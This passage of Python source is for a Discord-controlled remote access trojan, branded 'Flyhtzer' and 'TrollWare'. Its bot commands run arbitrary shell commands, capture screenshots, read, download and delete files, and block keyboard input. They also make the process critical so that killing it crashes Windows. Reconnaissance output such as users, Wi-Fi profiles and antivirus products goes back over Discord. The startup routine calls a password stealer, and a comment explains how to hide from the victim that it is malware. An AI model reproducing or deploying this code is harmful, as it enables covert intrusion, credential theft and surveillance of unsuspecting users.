                    embed = discord.Embed(title = f"Flyhtzer", color=embedcolor)
                    embed.add_field(name = ">camera", value = "```No Camera Detected!```",  inline=False)
                    await ctx.send(embed = embed)

            @client.command()
            async def cmd(ctx, customcommand, output_type):
                if output_type == "embed":
                    com_output = os.popen(f'{customcommand}').read()
                    try:	
                        embed = discord.Embed(title = f"Flyhtzer - ({customcommand})", color=embedcolor)
                        embed.add_field(name = ">cmd", value = f"```{com_output}```",  inline=False)
                        await ctx.send(embed = embed)
                    except Exception as e:
                        embed = discord.Embed(title = "Flyhtzer Error", color=embedcolor)
                        embed.add_field(name = "DETAILS:", value = f"```{e}```",  inline=False)
                        await ctx.send(embed = embed)
                else:
                    com_output = os.popen(f'{customcommand}').read()
                    os.system('echo cmd > C:\\ProgramData\\cmddata.txt')
                    f = open("C:\\ProgramData\\cmddata.txt", "w")
                    f.write(com_output)
                    f.close()
                    embed = discord.Embed(title = f"Flyhtzer - ({customcommand})", color=embedcolor)
                    embed.add_field(name = ">cmd", value = "```Sending Output File...```",  inline=False)
                    await ctx.send(embed = embed)
                    await ctx.send(file=discord.File(r'C:\\ProgramData\\cmddata.txt'))
                    os.remove('C:\\ProgramData\\cmddata.txt')

            @client.command()
            async def blockinput(ctx):
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                if is_admin == True:
                    try:	
                        ok = windll.user32.BlockInput(True)
                        embed = discord.Embed(title = f"Flyhtzer", color=embedcolor)
                        embed.add_field(name = ">blockinput", value = f"```Input has been blocked! [use >unblockinput to unblock]```",  inline=False)
                        await ctx.send(embed = embed)
                    except Exception as e:
                        embed = discord.Embed(title = "Flyhtzer Error", color=embedcolor)
                        embed.add_field(name = "DETAILS:", value = f"```{e}```",  inline=False)
                        await ctx.send(embed = embed)
                else:
                    embed = discord.Embed(title = f"Flyhtzer Error", color=embedcolor)
                    embed.add_field(name = ">blockinput", value = f"```You need ADMIN Privileges for this command!```",  inline=False)
                    await ctx.send(embed = embed)

            @client.command()
            async def unblockinput(ctx):
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                if is_admin == True:
                    try:	
                        ok = windll.user32.BlockInput(False)
                        embed = discord.Embed(title = f"Flyhtzer", color=embedcolor)
                        embed.add_field(name = ">unblockinput", value = f"```Input has been unblocked!```",  inline=False)
                        await ctx.send(embed = embed)
                        
                    except Exception as e:
                        embed = discord.Embed(title = "Flyhtzer Error", color=embedcolor)
                        embed.add_field(name = "DETAILS:", value = f"```{e}```",  inline=False)
                        await ctx.send(embed = embed)
                else:
                    embed = discord.Embed(title = f"TrollWare Error", color=embedcolor)
                    embed.add_field(name = ">unblockinput", value = f"```You need ADMIN Privileges for this command!```",  inline=False)
                    await ctx.send(embed = embed)

            @client.command()
            async def setwallpaper(ctx):
                path = os.path.join(os.getenv('TEMP') + "\\temp.jpg")
                await ctx.message.attachments[0].save(path)
                ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
                embed = discord.Embed(title = f"TrollWare", color=embedcolor)
                embed.add_field(name = ">setwallpaper", value = f"```Wallpaper Set Successfully!```",  inline=False)
                await ctx.send(embed = embed)

            @client.command()
            async def messagebox(ctx, message):
                os.system('powershell "(new-object -ComObject wscript.shell).Popup(\\"{}\\",0,\\"Windows\\")"'.format(message))
                ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
                embed = discord.Embed(title = f"TrollWare", color=embedcolor)
                embed.add_field(name = ">messagebox", value = f"```MessageBox Shown!```",  inline=False)
                await ctx.send(embed = embed)

            @client.command()
            async def upload(ctx, filename):
                try:
                    path = os.path.join(os.getenv('TEMP') + f"\\{filename}")
                    await ctx.message.attachments[0].save(path)
                    embed = discord.Embed(title = f"TrollWare {path}", color=embedcolor)
                    embed.add_field(name = ">upload", value = f"```Uploaded File Successfully!```",  inline=False)
                    await ctx.send(embed = embed)
                except:
                    embed = discord.Embed(title = f"TrollWare Error", color=embedcolor)
                    embed.add_field(name = ">upload", value = f"```Error! make sure the <filename> includes the extension (ex. lol.exe)```",  inline=False)
                    await ctx.send(embed = embed)                    

            @client.command()
            async def screenshot(ctx):
                screenshot = ImageGrab.grab()
                screenshot.save("C:\ProgramData\Desktop.jpg")
                await ctx.send(file=discord.File(fr'C:\ProgramData\Desktop.jpg'))
                os.remove('C:\ProgramData\Desktop.jpg')

            @client.command()
            async def scrapecomputer(ctx):
                embed = discord.Embed(title = f"TrollWare", color=embedcolor)
                embed.add_field(name = ">scrapecomputer", value = f"```Gathering & Sending Data...```",  inline=False)
                await ctx.send(embed = embed)
                f = open("C:\ProgramData\scrapepc.txt", "w+", encoding="utf-8")
                scrapecmds={
                    "Current User":"whoami /all",
                    "Local Network":"ipconfig /all",
                    "FireWall Config":"netsh firewall show config",
                    "Online Users":"quser",
                    "Local Users":"net user",
                    "Admin Users": "net localgroup administrators",
                    "Anti-Virus Programs":r"WMIC /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName,productState,pathToSignedProductExe",
                    "Port Information":"netstat -ano",
                    "Routing Information":"route print",
                    "Hosts":"type c:\Windows\system32\drivers\etc\hosts",
                    "WIFI Networks":"netsh wlan show profile",
                    "Startups":"wmic startup get command, caption",
                    "DNS Records":"ipconfig /displaydns",
                    "User Group Information":"net localgroup",
                }   
                for key,value in scrapecmds.items():
                    f.write('\n─────────────────────[%s]─────────────────────'%key)
                    cmd_output = os.popen(value).read()
                    f.write(cmd_output)
                f.close()
                await ctx.send(file=discord.File(fr'C:\ProgramData\scrapepc.txt'))
                os.remove('C:\ProgramData\scrapepc.txt')

            @client.command()
            async def systeminfo(ctx):
                    driverinfo = os.popen('SYSTEMINFO').read()
                    os.system('echo cmd > C:\\ProgramData\\systeminfo.txt')
                    f = open("C:\\ProgramData\\systeminfo.txt", "w")
                    f.write(driverinfo)
                    f.close()
                    embed = discord.Embed(title = f"TrollWare", color=embedcolor)
                    embed.add_field(name = ">systeminfo", value = "```Gathering & Sending Data...```",  inline=False)
                    await ctx.send(embed = embed)
                    await ctx.send(file=discord.File(r'C:\\ProgramData\\systeminfo.txt'))
                    os.remove('C:\\ProgramData\\systeminfo.txt')

            @client.command()
            async def saymessage(ctx, message):
                import win32com.client as wincl
                speak = wincl.Dispatch("SAPI.SpVoice")
                speak.Speak(message)
                embed = discord.Embed(title = f"TrollWare - ({message})", color=embedcolor)
                embed.add_field(name = ">saymessage", value = f"```Voiced Successfully!```",  inline=False)
                await ctx.send(embed = embed)

            @client.command()
            async def criticalproc(ctx):
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                if is_admin == True:
                    try:	
                        ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
                        ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
                        embed = discord.Embed(title = f"TrollWare", color=embedcolor)
                        embed.add_field(name = ">criticalproc", value = f"```This process has been made critical (Will bluescreen if closed)```",  inline=False)
                        await ctx.send(embed = embed)
                        
                    except Exception as e:
                        embed = discord.Embed(title = "TrollWare Error", color=embedcolor)
                        embed.add_field(name = "DETAILS:", value = f"```{e}```",  inline=False)
                        await ctx.send(embed = embed)
                else:
                    embed = discord.Embed(title = f"TrollWare Error", color=embedcolor)
                    embed.add_field(name = ">criticalproc", value = f"```You need ADMIN Privileges for this command!```",  inline=False)
                    await ctx.send(embed = embed)

            @client.command()
            async def read(ctx, file, output_type):
                files = open(file, "r").read()
                if output_type == "embed":
                    embed = discord.Embed(title = f"TrollWare - ({file})", color=embedcolor)
                    embed.add_field(name = ">read", value = f"```\n{files}\n```",  inline=False)
                    await ctx.send(embed = embed)
                else:
                    os.system('echo files > C:\\ProgramData\\readdata.txt')
                    f = open("C:\\ProgramData\\readdata.txt", "w")
                    f.write(files)
                    f.close()
                    embed = discord.Embed(title = f"TrollWare - ({file})", color=embedcolor)
                    embed.add_field(name = ">read", value = f"```Read File Successfully, Sending Output```",  inline=False)
                    await ctx.send(embed = embed)
                    await ctx.send(file=discord.File(r'C:\\ProgramData\\readdata.txt'))
                    os.remove('C:\\ProgramData\\readdata.txt')
        
            @client.command()
            async def download(ctx, filepath):
                embed = discord.Embed(title = f"TrollWare - ({filepath})", color=embedcolor)
                embed.add_field(name = ">download", value = f"```{filepath} Successfully Downloaded!```",  inline=False)
                await ctx.send(embed = embed)
                await ctx.send(file=discord.File(fr'{filepath}'))
            
            @client.command()
            async def delete(ctx, file):
                os.remove(file)
                embed = discord.Embed(title = f"TrollWare - ({file})", color=embedcolor)
                embed.add_field(name = ">delete", value = f"```Successfully Deleted: {file}```",  inline=False)
                await ctx.send(embed = embed)

            @client.command()
            async def endtask(ctx, taskname):
                try:
                    os.system('taskkill /im ' + taskname + ' /f')
                    embed = discord.Embed(title = f"TrollWare - ({taskname})", color=embedcolor)
                    embed.add_field(name = ">endtask", value = f"```Successfully Ended: {taskname}```",  inline=False)
                    await ctx.send(embed = embed)
                except Exception as e:
                    embed = discord.Embed(title = "TrollWare Error", color=embedcolor)
                    embed.add_field(name = "DETAILS:", value = f"```{e}```",  inline=False)
                    await ctx.send(embed = embed)

            @client.command()
            async def admincheck(ctx):
                admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                if admin == True:
                    embed = discord.Embed(title = "TrollWare", color=embedcolor)
                    embed.add_field(name = ">admincheck", value = "```Program has Admin Privileges: TRUE```",  inline=False)
                    await ctx.send(embed = embed)
                elif admin == False:
                    embed = discord.Embed(title = "TrollWare", color=embedcolor)
                    embed.add_field(name = ">admincheck", value = "```Program has Admin Privileges: FALSE```",  inline=False)
                    await ctx.send(embed = embed)	

            @client.command()
            async def drivers(ctx):
                    driverinfo = os.popen('DRIVERQUERY').read()
                    os.system('echo cmd > C:\\ProgramData\\driverdata.txt')
                    f = open("C:\\ProgramData\\driverdata.txt", "w")
                    f.write(driverinfo)
                    f.close()
                    embed = discord.Embed(title = f"Flyhtzer", color=embedcolor)
                    embed.add_field(name = ">drivers", value = "```Sending Drivers File...```",  inline=False)
                    await ctx.send(embed = embed)
                    await ctx.send(file=discord.File(r'C:\\ProgramData\\driverdata.txt'))
                    os.remove('C:\\ProgramData\\driverdata.txt')

            if runrat:
                client.run(BotToken) # Use {runrat = True/False} to start RAT Bot

# Remove this & the prints if you don't want the person to know it's malware!
def StartupAscii():
    os.system("color 4")
    print(f"""
             [CREATED BY: github.com/flyhtz]                   

    """)

def start(): 
    StartupAscii()
    print(" [+] Startup!\n")
    Logging.System.FetchComputer()
    print(" [+] Computer embed has been sent\n")
    print(" [+] Files have been sent\n")
    Logging.Passwords.PasswordStealer()
    print(" [+] RAT has been started!")
    Logging.RAT.StartRAT()
start()
